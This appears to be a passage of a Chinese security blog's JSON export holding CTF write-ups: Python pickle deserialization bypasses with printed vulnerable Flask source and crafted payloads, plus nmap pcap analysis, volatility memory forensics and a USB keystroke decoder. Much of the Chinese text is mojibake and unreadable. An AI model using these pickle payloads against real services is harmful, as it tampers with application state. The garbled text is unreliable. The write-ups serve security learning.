Animal(&#x27;kitty&#x27;, &#x27;cat&#x27;) pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template(&#x27;unpickle_page.html&#x27;, sample_obj=sample_obj, pickle_data=pickle_data)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000) é¢˜ç›®çš„è¦æ±‚æ˜¯,ä¼ å…¥ä¸€ä¸ªç»è¿‡base64åŠ å¯†çš„pickleåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œåœ¨æœåŠ¡å™¨ç«¯å¯¹è¯¥å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œå¦‚æœä¸åŒ…å«RæŒ‡ä»¤ç å¹¶ä¸”è§£æåçš„å¯¹è±¡ç±»å‹ä¸ºAnimalï¼Œå¹¶ä¸”ä¸å…¶è§„å®šçš„favoriteå¯¹è±¡çš„nameä¸categoryå±æ€§éƒ½ä¸€æ ·çš„è¯ï¼Œåˆ™å¯è·å¾—flagã€‚å¯¹ä»£ç è¿›è¡Œå®¡è®¡ï¼Œè§‚å¯Ÿç¬¬34è¡Œï¼Œè¿‡æ»¤äº†RæŒ‡ä»¤ç ï¼Œå³å µä¸Šäº†RCEè¿™æ¡è·¯ã€‚ç»§ç»­åˆ†æï¼Œå‘ç°å¹¶æ²¡æœ‰é‡å†™find_classæ–¹æ³•ï¼Œå³å¯ä»¥é€šè¿‡å¼•å…¥favorite.name å’Œfavorite.categoryçš„æ–¹æ³•é€šè¿‡åˆ¤å®šã€‚å³ï¼š 123o1=Animal()o1.name=favorite.nameo1.category=favorite.category è¿™æ ·æ„é€ çš„å¯¹è±¡å¯ä»¥ä¿è¯é€šè¿‡**correct = (result == Animal(favorite.name, favorite.category))**è¿™å¥ä»£ç çš„åˆ¤å®šã€‚æ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯æ„é€ è¿™ç§å¯¹è±¡ã€‚é€šè¿‡å¯¹æŒ‡ä»¤ç çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºè¿™ç§å¯¹è±¡ã€‚é¦–å…ˆæ„é€ æ­£å¸¸çš„animalå¯¹è±¡ã€‚ 1234567891011121314151617181920212223242526import pickle,pickletoolso1=Animal(&#x27;xx&#x27;,&#x27;yy&#x27;)normal=pickle.dumps(o1)#è¿™æ˜¯æ­£å¸¸animalç»åºåˆ—åŒ–åçš„æ•°æ®,ser=b&#x27;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x02\\x00\\x00\\x00xxq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x02\\x00\\x00\\x00yyq\\x06ub.&#x27;#è¿™æ˜¯åºåˆ—åŒ–ä¹‹åçš„æ•°æ®ï¼ˆå­—ç¬¦ä¸²å½¢å¼ï¼‰å…¶å®å°±æ˜¯normalï¼Œæˆ‘æŠŠå®ƒæ‰“å°å‡ºæ¥äº†ã€‚pickletools.dis(normal)#ä¸‹é¢ä¸ºpickletools.dis(normal)çš„ç»“æœ0: \\x80 PROTO 3 2: c GLOBAL &#x27;__main__ Animal&#x27; 19: q BINPUT 0 21: ) EMPTY_TUPLE 22: \\x81 NEWOBJ 23: q BINPUT 1 25: &#125; EMPTY_DICT 26: q BINPUT 2 28: ( MARK 29: X BINUNICODE &#x27;name&#x27; 38: q BINPUT 3 40: X BINUNICODE &#x27;xx&#x27; 47: q BINPUT 4 49: X BINUNICODE &#x27;category&#x27; 62: q BINPUT 5 64: X BINUNICODE &#x27;yy&#x27; 71: q BINPUT 6 73: u SETITEMS (MARK at 28) 74: b BUILD 75: . STOP æ ¹æ®æ€è·¯ï¼Œåªéœ€è¦æŠŠ40 64æ ‡å·å¤„çš„å€¼æ›¿æ¢ä¸ºfavorite.nameã€favorite.categoryå³å¯ã€‚æ–¹æ³•ï¼šä½¿ç”¨c(global)æŒ‡ä»¤å¼•å…¥æˆ‘ä»¬æ‰€éœ€çš„æ•°æ®ã€‚å³æŠŠâ€™xxâ€™ é€šè¿‡cæŒ‡ä»¤æ¢æˆfavorite.nameï¼Œâ€™yyâ€™æ¢æˆfavorite.categoryå®ç°ï¼šæŠŠserä¸­xxä¸yyçš„ç¼–ç ä½¿ç”¨golbal favorite.xxæ›¿æ¢ã€‚ 1payload=b&#x27;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03cfavorite\\nname\\nq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05cfavorite\\ncategory\\nq\\x06ub.&#x27; Then,encode it! 1print(base64.b64encode(payload)) æœ€ç»ˆç»“æœ:gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA2NmYXZvcml0ZQpuYW1lCnEEWAgAAABjYXRlZ29yeXEFY2Zhdm9yaXRlCmNhdGVnb3J5CnEGdWIu ç¬¬äºŒé¢˜é¢˜ç›®é“¾æ¥ï¼šHITCTFé¢˜ç›®æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import base64import ioimport sysimport picklefrom flask import Flask, Response, render_template, requestimport favoriteapp = Flask(__name__)class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f&#x27;Animal(name=&#123;self.name!r&#125;, category=&#123;self.category!r&#125;)&#x27; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.categoryclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == &#x27;__main__&#x27;: return getattr(sys.modules[&#x27;__main__&#x27;], name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()def read(filename, encoding=&#x27;utf-8&#x27;): with open(filename, &#x27;r&#x27;, encoding=encoding) as fin: return fin.read()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index(): if request.args.get(&#x27;source&#x27;): return Response(read(__file__), mimetype=&#x27;text/plain&#x27;) if request.method == &#x27;POST&#x27;: try: pickle_data = request.form.get(&#x27;data&#x27;) if b&#x27;R&#x27; in base64.b64decode(pickle_data): return &#x27;No... I don\\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27; else: result = restricted_loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return &#x27;Are you sure that is an animal???&#x27; correct = (result == Animal(favorite.name, favorite.category)) return render_template(&#x27;unpickle_result.html&#x27;, result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: print(repr(e)) return &quot;Something wrong&quot; sample_obj = Animal(&#x27;kitty&#x27;, &#x27;cat&#x27;) pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template(&#x27;unpickle_page.html&#x27;, sample_obj=sample_obj, pickle_data=pickle_data)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000) é¢˜ç›®åˆ†æï¼šç›¸æ¯”ä¸Šä¸€ä¸ªé¢˜ï¼Œè¯¥é¢˜å¤šäº†ä¸€ä¸ªfind_classæ–¹æ³•çš„é‡å†™ã€‚è§„å®šäº†moduleåªèƒ½æ˜¯mainä¸­çš„ï¼Œæ‰€ä»¥å°±æ— æ³•å¼•å…¥favoriteäº†ã€‚è§£é¢˜æ€è·¯ï¼šé€šè¿‡__main__.blueå¼•å…¥è¿™ä¸€ä¸ªmoduleï¼Œç”±äºå‘½åç©ºé—´è¿˜åœ¨mainå†…ï¼Œæ•…ä¸ä¼šè¢«æ‹¦æˆªã€‚ç„¶åä¿®æ”¹å½“å‰å¼•å…¥å¯¹è±¡çš„å±æ€§ï¼Œè‡ªå®šä¹‰å³å¯ã€‚ç„¶åæŠŠè¿™ä¸ªå¯¹è±¡å¼¹å‡ºï¼Œå†å‹å…¥ä¸€ä¸ªæ­£å¸¸çš„animalå¯¹è±¡ã€‚æ³¨æ„ï¼šè¯¥æ­£å¸¸å¯¹è±¡çš„å±æ€§å€¼é¡»ä¸ä½ åˆšæ‰è®¾å®šçš„å±æ€§å€¼ç›¸åŒã€‚payload=bâ€™\\x80\\x03c__main__\\nfavorite\\n}(X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00xxX\\x08\\x00\\x00\\x00categoryX\\x02\\x00\\x00\\x00yyub0c__main__\\nAnimal\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00xxX\\x08\\x00\\x00\\x00categoryX\\x02\\x00\\x00\\x00yyub.â€™ç»è¿‡base64åŠ å¯†åæäº¤å³å¯ã€‚ æ€»ç»“è¿™ç±»é—®é¢˜åªèƒ½è¯´åˆæ­¥äº†è§£ï¼Œå…·ä½“è¿˜æœ‰å¾ˆå¤šç»†èŠ‚æ²¡æœ‰å¼„æ˜ç™½ã€‚è¿˜éœ€è¦è¿›ä¸€æ­¥å­¦ä¹ ã€‚æœ€åä¸€é“é¢˜çš„payloadåœ¨å†™å®Œfavorite\\nåå‹å…¥ä¸€ä¸ªç©ºdictåï¼ŒæŠŠå½“å‰æ ˆè¿™ä¸ªæ•´ä½“ï¼Œä½œä¸ºä¸€ä¸ªlistï¼Œå‹è¿›å‰åºæ ˆï¼ˆopcode: (ï¼ˆ ä¹Ÿå°±æ˜¯MARKæ“ä½œç¬¦ï¼‰ï¼‰ã€‚ä¹‹åçš„æ“ä½œå°±æ˜¯æ›´æ–°favorite.name å’Œfavorite.categoryåˆ†åˆ«ä¸ºxx å’Œyyã€‚å¯¹åº”X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00xxX\\x08\\x00\\x00\\x00categoryX\\x02\\x00\\x00\\x00yyã€‚ç„¶åuå°±æ˜¯å½¢æˆé”®å€¼å¯¹ï¼Œb-buildï¼ŒæŠŠå½“å‰é”®å€¼å¯¹çš„å€¼ç»™å‰åºæ ˆä¸­çš„å¯¹è±¡ã€‚è¿™æ ·å‰åŠéƒ¨åˆ†çš„æ“ä½œå°±å®Œæˆäº†ã€‚å¯¹è¯¥å¯¹è±¡ä¿®æ”¹å®Œä¹‹åç›´æ¥å¼¹å‡º(opcode : 0)ï¼Œä¸ç®¡ä»–äº†ï¼Œç„¶åå†æ’ä¸€ä¸ªæ­£ç»å¯¹è±¡ï¼Œå±æ€§å€¼ä¸€æ ·å°±OKã€‚","categories":[{"name":"webåŸºç¡€","slug":"webåŸºç¡€","permalink":"https://polosec.github.io/categories/web%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"ä¸‰æ¡å‘½ä»¤","slug":"ä¸‰æ¡å‘½ä»¤","date":"2020-03-09T13:53:48.000Z","updated":"2020-03-09T14:15:19.130Z","comments":true,"path":"2020/03/09/ä¸‰æ¡å‘½ä»¤/","link":"","permalink":"https://polosec.github.io/2020/03/09/%E4%B8%89%E6%9D%A1%E5%91%BD%E4%BB%A4/","excerpt":"","text":"é¢„å¤‡çŸ¥è¯† wiresharkã€SYNã€TCPã€HTTPå‚è€ƒã€è‡´æ•¬:WireSharkæ•™ç¨‹ â€“ é»‘å®¢å‘ç°ä¹‹æ—…(5) â€“ (nmap)æ‰«ææ¢æµ‹ æ–‡ä»¶åˆ†æé‚£åˆ°æ‰‹çš„æ–‡ä»¶å•¥ä¹Ÿä¸æ˜¯ï¼Œæ–‡ä»¶åzipï¼Œè€ƒè™‘å‹ç¼©æ–‡ä»¶ã€‚è§£å‹åå¾—åˆ°ä¸€æ•°æ®åŒ…ï¼Œç”¨wiresharkæ‰“å¼€ æ•°æ®åŒ…åˆ†æå¸¸è§„è¿½è¸ªäº†ä¸€ä¸‹TCPæµã€HTTPæµã€å¯¼å‡ºå¯¹è±¡ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆæ”¶è·ã€‚æ¥ä¸‹æ¥åˆ†æé¢˜ç›®ï¼Œè¯´æ˜¯æ‰«æç«¯å£ï¼Œç»“åˆHTTPå¯¼å‡ºå¯¹è±¡ä¸­çš„nmapå­—æ ·ï¼ŒçŒœæµ‹æ˜¯NMAPæ‰«æã€‚ç»“åˆå‚è€ƒä¸­çš„é“¾æ¥ï¼Œå¯ä»¥æ¨æµ‹æ‰«ææ–¹å¼ä¸ºå…¨è¿æ¥æ‰«æã€‚é€šè¿‡å¯¹ç‰¹å¾å­—æ®µçš„åˆ†æï¼Œå‘ç°ç«¯å£å­˜åœ¨çš„æ•°æ®åŒ…è¿”å›çš„TSecrå­—æ®µçš„å€¼ä¸ä¸º0ï¼Œåˆ™å¯ä»¥æ ¹æ®æ­¤æ‰¾å‡ºå¼€æ”¾çš„ç«¯å£ã€‚æŒ‰ctrl+få¼¹å‡ºä¸Šæ–¹æœç´¢æ¡†ï¼Œé€‰æ‹©å­—ç¬¦ä¸²ï¼Œæœç´¢TSecr=4799ã€‚ é¢˜ç›®æ€»ç»“è¿™é“é¢˜å…¶å®ä¸å¤ªéš¾ï¼Œæ‡‚å¾—æ‰«ææ–¹å¼å¯ä»¥æŠŠè¿™é¢˜ç§’äº†ï¼Œä½†æ˜¯æˆ‘8å¤ªæ‡‚ï¼Œè¿˜æ˜¯ç°ç™¾åº¦çš„ã€‚äº‹å®è¯æ˜è€ƒé«˜åˆ†æ²¡ç”¨ï¼Œé‡è¦çš„æ˜¯å®è·µï¼","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"},{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"}]},{"title":"usb&å†…å­˜å–è¯","slug":"usb-å†…å­˜å–è¯","date":"2020-03-09T12:46:06.000Z","updated":"2020-03-28T09:13:38.667Z","comments":true,"path":"2020/03/09/usb-å†…å­˜å–è¯/","link":"","permalink":"https://polosec.github.io/2020/03/09/usb-%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/","excerpt":"","text":"é¢„å¤‡çŸ¥è¯†ï¼šwiresharkæµé‡åˆ†æã€binwalkã€å†…å­˜å–è¯ã€USBã€volatility ã€stringsã€grepå‚è€ƒã€è‡´æ•¬ï¼šCTF å†…å­˜å–è¯ USBæµé‡åˆ†æ é™„ä»¶åˆ†ææ‹¿åˆ°é™„ä»¶åï¼Œåªæœ‰ä¸€ä¸ªæ•°æ®åŒ…æ–‡ä»¶ã€‚ä¸ç”¨æƒ³ï¼Œç›´æ¥ç”¨wiresharkæ‰“å¼€åˆ†æä¸€æ³¢ã€‚##æ–‡ä»¶åˆ†æè¿™ç©æ„ç¡®å®æŒºå¤§çš„ï¼Œé¦–å…ˆè€ƒè™‘åŒ…å«äº†æ–‡ä»¶ï¼Œä½¿ç”¨kali linux ä¸‹çš„å·¥å…·binwalkåˆ†æä¸€æ³¢ã€‚ä½†æ˜¯binwalkå‡ºæ¥çš„é™„ä»¶åœ¨è§£å‹æ—¶éƒ½æŸåäº†ï¼Œæ­¤è·¯ä¸é€šã€‚ç»§ç»­åˆ†ææˆ‘ä»¬çš„æµé‡åŒ…ï¼Œè¿½è¸ªhttpåè®®ã€‚å‘ç°äº†å·¨å¤§çš„åŒ…ï¼Œå¯èƒ½æœ‰é™„ä»¶ï¼Œäºæ˜¯åœ¨wiresharkä¸­å¯¼å‡ºhttpå¯¹è±¡ã€‚ï¼ˆå·¦ä¸Šè§’æ–‡ä»¶-å¯¼å‡ºå¯¹è±¡-httpï¼‰æ¥ä¸‹æ¥è§‚å¯Ÿå¯¼å‡ºçš„æ–‡ä»¶æœ‰ä¸¤ä¸ªä¸€æ ·çš„è¾ƒå¤§çš„phpæ–‡ä»¶ï¼Œè€ƒè™‘æ–‡ä»¶åŒ…å«ã€‚å†æ¬¡ä¸¢åˆ°binwalké‡Œé¢åˆ†æä¸€æ³¢ã€‚æœä¸å…¶ç„¶ï¼Œåˆ†ç¦»å‡ºäº†data.vmemæ–‡ä»¶ã€‚å¯ä»¥ç†è§£ä¸ºvmemæ–‡ä»¶ä¿å­˜äº†å½“æ—¶å†…å­˜ä¸­çš„æ•°æ®ï¼Œä»¥æ”¯æŒåœ¨è™šæ‹Ÿæœºä¸­çš„æš‚åœåŠŸèƒ½ã€‚æ¥ä¸‹æ¥ç”¨å†…å­˜åˆ†æå·¥å…·volatility åˆ†ædata.vmemä½¿ç”¨æ–¹æ³•ï¼š volatility -f filename imageinfo //æŸ¥çœ‹é•œåƒä¿¡æ¯ã€‚é€šè¿‡imageinfo å¯ä»¥ç¡®å®šï¼Œé•œåƒä¸ºWinXPSP2x86æˆ–è€…WinXPSP3x86.ï¼ˆå½±å“ä¸å¤§ï¼‰æ¥ä¸‹æ¥ä½¿ç”¨å‘½ä»¤ volatility -f data.vmem â€“profile=WinXPSP2x86 filescan æ‰«æå†…å­˜ä¸­çš„æ–‡ä»¶å¯ä»¥çœ‹åˆ°æœ‰ä¸€å †æ–‡ä»¶ã€‚ç”±äºæ˜¯ctfæ¯”èµ›ï¼Œå°è¯•è¿‡æ»¤æ–‡ä»¶ï¼šæ¯”èµ›åç§°xctfæˆ–è€…flag å³volatility -f data.vmem â€“profile=WinXPSP2x86 filescan |grep flagvolatility -f data.vmem â€“profile=WinXPSP2x86 filescan |grep xctf]é€šè¿‡è¿‡æ»¤flag æˆ‘ä»¬æ‰¾åˆ°äº†flag.imgæ–‡ä»¶ã€‚ DUMP IT!æ¥ä¸‹æ¥éœ€è¦åšçš„äº‹å°†flag.img å¯¼å‡ºã€‚ä½¿ç”¨å‘½ä»¤ volatility -f data.vmem â€“profile=WinXPSP2x86 dumpfiles -Q 0x0000000001155f90 -D ./å°†æ–‡ä»¶å¯¼å‡ºè‡³å½“å‰ç›®å½•ã€‚å¯¼å‡ºæ–‡ä»¶ä¸ºäºŒè¿›åˆ¶æ ¼å¼ã€‚æ¥ä¸‹æ¥ç»§ç»­binwalkåˆ†æã€‚å¯ä»¥å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…é‡ŒåŒ…å«äº†åŠ å¯†çš„usb.txtæ–‡ä»¶ã€‚ä¸‹ä¸€æ­¥å°±æ˜¯è·å–åŠ å¯†çš„å¯†ç ã€‚åœ¨å°è¯•çˆ†ç ´çš„åŒæ—¶ï¼Œç»§ç»­è¿›è¡Œå†…å­˜å–è¯åˆ†æã€‚é€šè¿‡volatilityå·¥å…·çš„å­å‘½ä»¤ hivelist å¯ä»¥è·å¾—å†…å­˜ä¸­çš„æ³¨å†Œè¡¨ä¿¡æ¯ï¼ŒcmdscanæŸ¥çœ‹cmdæ“ä½œï¼ŒconnscanæŸ¥çœ‹ç½‘ç»œè¿æ¥ï¼ŒpslistæŸ¥çœ‹è¿›ç¨‹ã€‚é€šè¿‡cmscanæˆ‘ä»¬å¯ä»¥å‘ç°æç¤ºäº†å¯†ç ï¼šå°è¯•å°†è¯¥å¯†ç ä½œä¸ºæ–‡ä»¶çš„è§£å‹å¯†ç ï¼ˆä½¿ç”¨360è§£å‹ï¼Œå¯ä»¥è‡ªåŠ¨ä¿®å¤æ–‡ä»¶ï¼‰â€”-æˆåŠŸï¼ç°åœ¨è·å¾—äº†æ•²å‡»ç ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å°†æ•²å‡»ç è½¬æ¢ä¸ºå­—ç¬¦ã€‚ä½¿ç”¨è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import sysimport os usb_codes = &#123; 0x04:&quot;aA&quot;, 0x05:&quot;bB&quot;, 0x06:&quot;cC&quot;, 0x07:&quot;dD&quot;, 0x08:&quot;eE&quot;, 0x09:&quot;fF&quot;, 0x0A:&quot;gG&quot;, 0x0B:&quot;hH&quot;, 0x0C:&quot;iI&quot;, 0x0D:&quot;jJ&quot;, 0x0E:&quot;kK&quot;, 0x0F:&quot;lL&quot;, 0x10:&quot;mM&quot;, 0x11:&quot;nN&quot;, 0x12:&quot;oO&quot;, 0x13:&quot;pP&quot;, 0x14:&quot;qQ&quot;, 0x15:&quot;rR&quot;, 0x16:&quot;sS&quot;, 0x17:&quot;tT&quot;, 0x18:&quot;uU&quot;, 0x19:&quot;vV&quot;, 0x1A:&quot;wW&quot;, 0x1B:&quot;xX&quot;, 0x1C:&quot;yY&quot;, 0x1D:&quot;zZ&quot;, 0x1E:&quot;1!&quot;, 0x1F:&quot;2@&quot;, 0x20:&quot;3#&quot;, 0x21:&quot;4$&quot;, 0x22:&quot;5%&quot;, 0x23:&quot;6^&quot;, 0x24:&quot;7&amp;&quot;, 0x25:&quot;8*&quot;, 0x26:&quot;9(&quot;, 0x27:&quot;0)&quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-_&quot;, 0x2E:&quot;=+&quot;, 0x2F:&quot;[&#123;&quot;, 0x30:&quot;]&#125;&quot;, 0x32:&quot;#~&quot;, 0x33:&quot;;:&quot;, 0x34:&quot;&#x27;\\&quot;&quot;, 0x36:&quot;,&lt;&quot;, 0x37:&quot;.&gt;&quot;, 0x4f:&quot;&gt;&quot;, 0x50:&quot;&lt;&quot; &#125; def code2chr(filepath): lines = [] pos = 0 for x in open(filepath,&quot;r&quot;).readlines(): code = int(x[6:8],16) # å³ç¬¬ä¸‰ä¸ªå­—èŠ‚ if code == 0: continue # newline or down arrow - move down if code == 0x51 or code == 0x28: pos += 1 continue # up arrow - move up if code == 0x52: pos -= 1 continue # select the character based on the Shift key while len(lines) &lt;= pos: lines.append(&quot;&quot;) if code in range(4,81): if int(x[0:2],16) == 2: lines[pos] += usb_codes[code][1] else: lines[pos] += usb_codes[code][0] for x in lines: print(x) if __name__ == &quot;__main__&quot;: # check argv if len(sys.argv) != 2: print(&quot;Usage:\\n\\tpython keyboardScanCode.py datafile.txt\\nhow to get datafile:\\t tshark -r file.usb.pcapng -T fields -e usb.capdata &gt; datafile.txt&quot;) exit(1) else: filepath = sys.argv[1] code2chr(filepath) è¯»å–usbdata.txtå³å¯è·å–flag.æ³¨æ„å°†æ‹¬å·[]è½¬ä¸º{} é¢˜ç›®æ€»ç»“","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"},{"name":"0307xctf","slug":"0307xctf","permalink":"https://polosec.github.io/tags/0307xctf/"}]},{"title":"ç®€å•misc","slug":"ç®€å•misc","date":"2020-03-09T12:26:32.000Z","updated":"2020-03-09T14:18:49.198Z","comments":true,"path":"2020/03/09/ç®€å•misc/","link":"","permalink":"https://polosec.github.io/2020/03/09/%E7%AE%80%E5%8D%95misc/","excerpt":"","text":"é¢„å¤‡çŸ¥è¯† :kali linuxã€binwalkä½¿ç”¨ã€æ–‡ä»¶å¤´æ–‡ä»¶å°¾ã€base64ã€æ‘©æ–¯å¯†ç é™„ä»¶åˆ†æï¼šæˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼ŒåŒ…æ‹¬äº†ä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ªå‹ç¼©åŒ…ã€‚å­å‹ç¼©åŒ…ä¸­æœ‰flagï¼Œä½†æ˜¯è¢«åŠ å¯†äº†ã€‚ å›¾ç‰‡å¤„ç†å°†å›¾ç‰‡è§£å‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å›¾ç‰‡æ˜¯è£‚çš„ï¼Œä¸èƒ½çœ‹ã€‚æ‰€ä»¥è€ƒè™‘å°†å›¾ç‰‡ä¿®å¤ã€‚å¸¸è§æ–‡ä»¶å¤´å°¾ä½¿ç”¨winhexæ‰“å¼€åï¼Œå‘ç°æ–‡ä»¶å¤´å°¾æ­£ç¡®ã€‚ä½†æ˜¯æ–‡ä»¶å°¾éƒ¨å¹¶ä¸æ˜¯ä»¥FF D9ç»“å°¾ã€‚æ‰€ä»¥æˆ‘ä»¬è€ƒè™‘å¯èƒ½æœ‰é¢å¤–çš„æ–‡ä»¶åŒ…å«åœ¨äº†è¿™å¼ å›¾ç‰‡ä¸­ã€‚ æ–‡ä»¶åˆ†ç¦»ä½¿ç”¨binwalk å·¥å…·ï¼Œå¯ä»¥åˆ†ææ–‡ä»¶ç»“æ„ï¼Œå°†å¤åˆæ–‡ä»¶æå–å‡ºæ¥ã€‚ä½¿ç”¨æ–¹æ³•ï¼šbinwalk -e filename eg:binwalk -e photo.jpgåˆ†æå®Œåå¯ä»¥å‘ç°æ–‡æœ¬ctf.txt æ‰“å¼€åå‘ç°æ˜¯æ‘©æ–¯å¯†ç ï¼Œä½¿ç”¨å·¥å…·å°†å…¶è§£å¯†åä¸ºEPIDEMICSITUATIONOFUNIVERSITYWARç”±äºä¸æ˜¯å¸¸è§çš„å¯†ç å½¢å¼ï¼Œäºæ˜¯å°è¯•base64è§£ç ã€‚è§£ç åå¾—åˆ°EPIDEMICSITUATIONOFUNIVERSITYWARç„¶åè§£å‹é™„ä»¶ä¸­çš„åŠ å¯†æ–‡ä»¶ã€‚è§£å‹åï¼Œé™„ä»¶flag.txtä¸­çš„æ–‡ä»¶å†…å®¹ä¸ºVGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ=çœ‹åˆ°**=**ï¼Œè€ƒè™‘base64ç¼–ç ã€‚è¿›è¡Œè§£ç ã€‚base64è§£ç å·¥å…·è§£ç åçš„å†…å®¹ä¸ºTh1s_is_FlaG_you_aRE_rigHTå³å¯è·å¾—æ­£ç¡®flagã€‚ é¢˜ç›®æ€»ç»“è¿™é“é¢˜ç›¸å¯¹æ¯”è¾ƒç®€å• è™½ç„¶å¸ˆå‚…ä»¬ç§’äº†ï¼Œæˆ‘è¿˜æ˜¯èŠ±äº†å‡ åˆ†é’Ÿæ‰åšå‡ºæ¥ã€‚ä¹Ÿå¯èƒ½æ˜¯è¿æ°”æˆåˆ†ï¼ŒåŠ ä¸Šè¿™é¢˜æ¯”è¾ƒç®€å•ï¼Œæ‰€ä»¥æ€è·¯æ¯”è¾ƒæ¸…æ™°ã€‚è¿™é¢˜çš„å…³é”®æ˜¯æ–‡ä»¶åˆ†ç¦»ä¸çœ‹å¾—æ‡‚ç¼–ç ã€‚baseç³»åˆ—ç¼–ç ä»‹ç»","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"},{"name":"0307xctf","slug":"0307xctf","permalink":"https://polosec.github.io/tags/0307xctf/"}]},{"title":"éšè—çš„ä¿¡æ¯","slug":"éšè—çš„ä¿¡æ¯","date":"2020-03-09T11:31:54.000Z","updated":"2020-03-09T14:17:43.483Z","comments":true,"path":"2020/03/09/éšè—çš„ä¿¡æ¯/","link":"","permalink":"https://polosec.github.io/2020/03/09/%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/","excerpt":"","text":"é¢„å¤‡çŸ¥è¯†ï¼šä¼ªåŠ å¯†é“¾æ¥ã€åå…­è¿›åˆ¶æ–‡ä»¶è¯»å–ã€éŸ³é¢‘å¤„ç†ã€äºŒç»´ç å¤åŸé™„ä»¶åˆ†æ1.æ‹¿åˆ°è¿™é“é¢˜çš„æ–‡ä»¶åï¼Œé¦–å…ˆçœ‹åˆ°ä¸€å¼ äºŒç»´ç ï¼Œè¿˜æœ‰ä¸€ä¸ªæœ‰è§£å‹å¯†ç çš„å‹ç¼©åŒ…ã€‚2.é¦–å…ˆå¯¹è¿™å¼ äºŒç»´ç è¿›è¡Œåˆ†æã€‚æ”¾å…¥WINHEX(16è¿›åˆ¶åˆ†æå·¥å…·)åå¯ä»¥å‘ç°ï¼Œåœ¨æ–‡ä»¶çš„æœ€åéšçº¦æœ‰æç¤ºâ€use base64 to get your flagâ€ã€‚æš‚æ—¶ä¸çŸ¥é“ä»€ä¹ˆç”¨ï¼Œè®°ä¸‹æ¥ã€‚3.ç”±äºäºŒç»´ç æ˜¯æ®‹ç¼ºçš„ï¼Œé€šè¿‡PSå¯¹äºŒç»´ç çš„ä¸‰ä¸ªå®šä½ç‚¹å¤åŸåå¯ä»¥è·å¾—åŸäºŒç»´ç ï¼Œç„¶è€Œæ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ã€‚è¿™é‡Œä¸ä½œè¯¦ç»†è§£é‡Šã€‚4.æ¥ä¸‹æ¥æˆ‘ä»¬ç€æ‰‹åˆ†æè¿™ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ã€‚ åŠ å¯†å‹ç¼©åŒ…å¤„ç†ç”±äºå‹ç¼©åŒ…æ˜¯åŠ å¯†çš„ï¼Œé¦–å…ˆè€ƒè™‘æš´åŠ›ç ´è§£ã€CRC32ç¢°æ’ç­‰æ–¹å¼ç ´è§£å¯†ç â€”-æ— æ•ˆã€‚æ¥ä¸‹æ¥è€ƒè™‘åˆ°å‹ç¼©åŒ…å¯èƒ½æ˜¯ä¼ªåŠ å¯†(å…³äºä¼ªåŠ å¯†çš„è¯¦ç»†æ¦‚å¿µè§é¢„å¤‡çŸ¥è¯†ä¸­çš„é“¾æ¥)ç®€å•æ¥è¯´å°±æ˜¯å®é™…ä¸Šå‹ç¼©åŒ…æ˜¯æ²¡æœ‰åŠ å¯†çš„ï¼Œåªæ˜¯å‡ºç°äº†è¡¨é¢ä¸ŠåŠ å¯†ï¼Œè®©ä½ è¾“å…¥è§£å‹å¯†ç ã€‚ç ´è§£ä¼ªåŠ 